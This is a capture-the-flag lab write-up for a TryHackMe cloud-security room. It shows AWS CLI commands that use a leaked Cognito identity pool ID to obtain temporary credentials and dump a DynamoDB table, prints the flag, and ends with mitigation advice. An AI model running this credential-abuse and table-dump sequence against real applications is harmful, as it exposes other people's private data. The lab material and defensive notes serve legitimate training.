---
layout: default
title: Day 3 - Complimentary Wellness App
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 2 - Room 404](../2_Room_404)

# Day 3 - Complimentary Wellness App

**Difficulty:** Easy  
**Category:** Cloud security / AWS Cognito exploitation

**Summary:** This room explores the dangers of exposing cloud infrastructure configurations in frontend code. By inspecting the source code of a static web application hosted on an AWS S3 bucket, we find hardcoded AWS Cognito details. We then use the AWS CLI to request temporary credentials and abuse overly permissive IAM roles to dump sensitive data directly from a DynamoDB table.

## 1. Reconnaissance

Our starting point is a web application hosted on an Amazon S3 bucket (`http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/`). 

Since this is a client-side application, the first logical step is to check the source code delivered to our browser. We opened the browser's developer tools (inspect element) and navigated to the Debugger/Sources tab to look at the JavaScript files.

Inside a file named `app.js`, we discovered hardcoded AWS configuration variables:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

This tells us the application uses AWS Cognito for identity management and interacts with a DynamoDB table. Exposing an Identity Pool ID can be dangerous if the unauthenticated role attached to it has too many permissions.

## 2. Exploitation (AWS CLI)

To exploit this, we will impersonate an unauthenticated user and ask AWS Cognito to give us temporary access keys. We perform this using the AWS Command Line Interface (CLI).

**Step 1: Get an Identity ID**
First, we request a unique Identity ID from the leaked pool:

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 --region us-east-1
```
AWS responds with our new ID: `"IdentityId": "us-east-1:4d571309-b01e-c28b-34ae-aa79cd22449d"`

**Step 2: Request temporary credentials**
Using this Identity ID, we ask Cognito for actual AWS credentials and save the output to a JSON file:

```bash
aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:4d571309-b01e-c28b-34ae-aa79cd22449d" --region us-east-1 > creds.json
```

**Step 3: Load credentials into the environment**
We need to tell our local AWS CLI to use these new credentials. We use the `jq` tool to extract the values from `creds.json` and export them as environment variables:

```bash
export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretKey' creds.json)
export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
```

We verify our access by running `aws sts get-caller-identity`, which confirms we are now authenticated under a Cognito role.

**Step 4: Dump the database**
Knowing the target DynamoDB table name from `app.js`, and hoping the developer gave this role too many permissions, we attempt to scan (read) the entire table:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

The database dumps all its records to our terminal, revealing the hidden flag among the wellness profiles.

**Flag:** 
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{fr33_app_fr33_d4t4!}</span>

## 3. Mitigation (how to fix it)

To prevent attackers from abusing AWS Cognito to read database contents, developers should implement the following security practices:

+ **Apply the principle of least privilege:** The IAM role assigned to unauthenticated Cognito users must have strict permissions. It should absolutely not have `dynamodb:Scan` permissions, which allows reading the entire database.
+ **Use a backend API:** Instead of allowing the frontend JavaScript to communicate directly with the database, create a secure backend API (using AWS API Gateway and Lambda). The frontend talks to the API, and the API securely handles database queries after validating the input.
+ **Implement fine-grained access control:** If direct database access is required, use IAM condition keys to ensure users can only read or write their own specific rows in the DynamoDB table, not the data belonging to other guests.

<br>
- [Day 4 - Packet Light](../4_Packed_Light)